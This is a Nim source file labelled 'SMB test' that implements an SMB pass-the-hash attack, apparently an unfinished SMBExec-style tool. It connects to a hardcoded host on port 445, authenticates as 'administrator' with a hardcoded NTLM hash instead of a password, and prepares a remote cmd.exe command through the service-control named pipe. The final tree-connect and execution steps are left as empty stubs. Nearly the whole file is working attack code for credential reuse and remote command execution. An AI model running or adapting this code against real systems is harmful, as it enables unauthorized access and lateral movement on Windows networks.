#[
    SMB test
]#

#SMB1

import net, strutils, sequtils, encodings, SMBv1, SMBv2, SMBv2Helper, HelpUtil

proc recvPacket(sock: Socket, bufSize, timeout: int): seq[string] =
    var buf: string
    try:
        while sock.recv(buf, 1, timeout) > 0:
            result.add(buf.toHex())
    except:
        discard

proc recvPacketForNTLM(sock: Socket, bufSize, timeout: int): string =
    var buf: string
    try:
        while sock.recv(buf, 1, timeout) > 0:
            result.add(buf)
    except:
        discard

proc checkSigning(data: seq[string]): bool =
    if data[70] == "03":
        result = true 

proc checkDialect(data: seq[string]): string =
    if data[4..7] == @["FF", "53", "4D", "42"]:
        result = "SMB1"
    else:
        result = "SMB2"

proc checkAuth(data: seq[string]): bool =
    if data[12..15] == @["00", "00", "00", "00"]:
        result = true

let sock = newSocket()
var 
    recvClient: seq[string]
    signing: bool
    response: string

let target = "192.168.1.22"

## Connect
sock.connect(target, 445.Port)

## SMBv1 Init negotiate
sock.send(getSMBv1NegoPacket())
recvClient = sock.recvPacket(1024, 100)

## Check Dialect
echo "Dialect: ", checkDialect recvClient

## Check Signing
signing = checkSigning recvClient
if signing:
    echo "Signing Enabled"
else:
    echo "Signing Disabled"

## SMBv2 negotiate
sock.send(getSMBv2NegoPacket())
recvClient = sock.recvPacket(1024, 100)

## SMBv2NTLM negotiate
sock.send(getSMBv2NTLMNego(signing))
response = sock.recvPacketForNTLM(1024, 100)

## Pass the hash
let 
    user = "administrator"
    hash = "47bf8039a8506cd67c524a03ff84ba4e"
    domain = "."
    authPacket = getSMBv2NTLMAuth(getSMBv2NTLMSSP(response, hash, domain, user, signing)) 
sock.send(authPacket)
recvClient = sock.recvPacket(1024, 100)

if checkAuth recvClient:
    echo "Successfully logged on!"
else:
    echo "Login failed"

let 
    SMBPath = r"\\" & target & r"\IPC$"
    SMBPathBytes = SMBPath.unicodeGetBytes()
    named_pipe_UUID = @[0x81.byte,0xbb.byte,0x7a.byte,0x36.byte,0x44.byte,0x98.byte,0xf1.byte,0x35.byte,0xad.byte,0x32.byte,0x98.byte,0xf0.byte,0x38.byte,0x00.byte,0x10.byte,0x03.byte]
    SMBService = "kaka"

var SMBServiceBytes = SMBService.unicodeGetBytes()

if SMBServiceBytes.len mod 2 != 0:
    SMBServiceBytes = SMBServiceBytes.concat(@[0x00.byte, 0x00.byte])
else:
    SMBServiceBytes = SMBServiceBytes.concat(@[0x00.byte, 0x00.byte, 0x00.byte, 0x00.byte])

let SMBServiceLength = getBytes(SMBService.len + 1)

let 
    command = "mkdir c:\\itWorks.txt"
    full_command = "%COMSPEC% /C " & "\"" & command & "\""

var SMBExecCommand: seq[string]

for i in unicodeGetBytes(full_command):
    SMBExecCommand.add i.toHex()

if full_command.len mod 2 != 0:
    SMBExecCommand = SMBExecCommand.concat(@["00", "00"])
else:
    SMBExecCommand = SMBExecCommand.concat(@["00", "00", "00", "00"])

let 
    SMBExecCommandBytes = SMBExecCommand.join().hexToByteArray() 
    SMBExecCommandLengthBytes = getBytes((SMBExecCommand.len() / 2).int)
    SMBSplitIndex = 4256


#### TreeConnect

## CheckAccess


sock.close()